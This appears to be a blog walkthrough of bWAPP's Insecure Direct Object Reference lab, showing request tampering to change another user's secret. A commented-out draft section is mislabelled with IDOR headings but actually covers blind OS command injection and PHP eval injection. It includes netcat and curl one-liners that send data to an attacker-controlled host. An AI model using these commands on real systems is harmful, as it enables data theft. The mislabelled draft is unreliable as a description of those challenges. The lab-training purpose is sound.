---
layout: post
published: true
title: "A4 - Insecure Direct Object References(IDOR) | Solutions of bWAPP | Walkthrough of All Levels"
date: 2020-07-29 23:32:20 +0300
description: Solutions of Insecure DOR (Change Secret), Insecure DOR (Reset Secret), Insecure DOR (Order Tickets) for the A4 - Insecure Direct Object References challanges.
excerpt: "Writeups of all levels in A4 - Insecure Direct Object References Catagory such as Solutions of Insecure DOR (Change Secret), Insecure DOR (Reset Secret), Insecure DOR (Order Tickets). "
image: "https://jaiguptanick.github.io/Blog/images/bwapp/a1/bWAPP_Writeup_solution_logo.png"
sitemap:
    priority: 0.8
    lastmod: 2020-09-29
    changefreq: monthly
---

<style>
/* This stylesheet sets the width of all images to 100%: */
img {
  width: 90%;
}
</style>

<h2 align="center" > </h2>
---
Here is a walkthrough and tutorial of the [bWAPP](http://www.itsecgames.com/) which is a vulnerable web application by itsecgames which you can download and test on your local machine. It has a complete list of OWASP vulnerabilities which we can practially test. <b>The best part of using bWAPP is that it is running on our local system so we have access to its source code, so if we got stuck somewhere then we can analyse its source code as it is very neat and describitive having comments wherever necessary.</b> We can see the function being used to restrict or sanatize the input,then can search for its vulnerablity on the web.

>Hello, today we are going to solve Insecure Direct Object Reference (IDOR) of Buggy Web Application such as Insecure DOR (Change Secret), Insecure DOR (Reset Secret), Insecure DOR (Order Tickets).

## Insecure DOR (Change Secret)
---
<h3>Security Level: low</h3>
Simply a text box, asking for the new secret key.

![Insecure DOR Change Secret]({{ site.baseurl }}https://jaiguptanick.github.io/Blog/images/bwapp/a4/idor_1.png)

Intersepting request provide us the username of the logged in user which can be modified,

![Insecure DOR Change Secret]({{ site.baseurl }}https://jaiguptanick.github.io/Blog/images/bwapp/a4/idor_2.png)

Now if we know the username of any other user then we can modify the request to make changes in someone else account whose account access we don't have.

![Insecure DOR Change Secret]({{ site.baseurl }}https://jaiguptanick.github.io/Blog/images/bwapp/a4/idor_3.png)

Like here we changes it to that of john to add this secret to john's accounts, but for this there mmust be a user name john.
Now if we take a look at the mysql database we can see that we have changes the secret of  john account from bee's account.

![Insecure DOR Change Secret]({{ site.baseurl }}https://jaiguptanick.github.io/Blog/images/bwapp/a4/idor_4.png)

If we look at the source code we can see that there is no condition or validation except character filter.

![Insecure DOR Change Secret]({{ site.baseurl }}https://jaiguptanick.github.io/Blog/images/bwapp/a4/c1.png)

<h3>Security Level: medium/high</h3>
Trying the same  but this time No login parameter in the request rather it is assigning unique random token to each user in each request to prevent data tempering.

![Insecure DOR Change Secret]({{ site.baseurl }}https://jaiguptanick.github.io/Blog/images/bwapp/a4/idor_5.png)

If we see the code we can see that it is validating each request:

![Insecure DOR Change Secret]({{ site.baseurl }}https://jaiguptanick.github.io/Blog/images/bwapp/a4/c2.png)

<!--
## Insecure DOR (Reset Secret)
---
This is as same as GET just the input is not displayed in the URL and is send securely. 

There is a way to bypass the blind injection with netcat by pipeing the output of a command to a nc listener. We could do something like 
```172.217.167.14 ; ls -la | nc {OUR_machine_IP} {PORT} ``` . This will send the output of ls -la to our netcat listener. BUT WHAT TO DO IF THE SERVER IS HOSTED ON A WINDOW MACHINE which do not have netcat by default so here we can use the curl command as ```type /path/to/file | curl –F “:data=@-“ http://our_malicious_server_ip/test.txt ``` . This sends the file data to our server and we can see the contents in our error log files on our malicious server. We can even send the files, for more see [HERE](https://www.contextis.com/us/blog/data-exfiltration-via-blind-os-command-injection).<br> But in this challange no such efforts are required as we can simply save the output of our malicious command to a file on the server and later access the file form the URL.<br>
Lets see practically:
Using the command ```172.217.167.14 | cd > present_workingdir.txt``` in the text box.

![Insecure DOR Reset Secret]({{ site.baseurl }}https://jaiguptanick.github.io/Blog/images/bwapp/a4/os_blind_l2.png)

Now moving to the file we created on the server ```https://localhost/bwapp/present_workingdir.txt```.

![Insecure DOR Reset Secret]({{ site.baseurl }}https://jaiguptanick.github.io/Blog/images/bwapp/a4/os_blind_l3.png)

Hence we can access each file on the server :)

<h3>Security Level: medium</h3>

Same works here as in medium level the function used by the server blocks the use of '&' and ; but we are actually using pipe for chaining the multiple commands.

<h3>Security Level: high</h3>

Here again they are using ```escapeshellcmd(); ``` function which ensure that user execute only one command , so we can't chain the commands in this level.

## Insecure DOR (Order Tickets)
---
>Code Injection consist of injecting code that is then interpreted/executed by the application. This type of attack exploits poor handling of untrusted data.

Here the system is using PHP so we will somehow inject some php code/command. If the server doesn't sanatizes our input, we can exploit and perform unusual activity.

<h3>Security Level: low</h3>
It is just throwing back the argument value used in the GET request.

![Insecure DOR Order Tickets]({{ site.baseurl }}https://jaiguptanick.github.io/Blog/images/bwapp/a4/php1.png)

Viewing the source code the function used is: ``` <?php @eval ("echo " . $_REQUEST["message"] . ";");?> ``` <br>
When a developer uses the PHP ```eval() ```function and passes it untrusted data that an attacker can modify, Insecure DOR Order Tickets could be possible. It is a dangerous way to use the eval() function as the user can provide any malicious input in the message argument and it will execute as a code as there is no input validation in eval function.
Now, in this challange we can use any PHP commands such as ```phpinfo()``` or can even run shell commands directly using ```system('<shell_command>');```
![Insecure DOR Order Tickets]({{ site.baseurl }}https://jaiguptanick.github.io/Blog/images/bwapp/a4/php2.png)

![Insecure DOR Order Tickets]({{ site.baseurl }}https://jaiguptanick.github.io/Blog/images/bwapp/a4/php3.png)

<h3>Security Level: medium and high</h3>

Medium and High Security level are using the ```<?php echo htmlspecialchars($_REQUEST["message"], ENT_QUOTES, "UTF-8");;?> ```
which sanatize the input and prevent the running of external code provided by replacing the restricted words and it is considering our input as a text.

![Insecure DOR Order Tickets]({{ site.baseurl }}https://jaiguptanick.github.io/Blog/images/bwapp/a4/php4.png)
-->

Under Contruction!!!!!!

/*<i>Thanks for your patience, I hope you enjoyed reading. Happy Hacking... </i>*/ 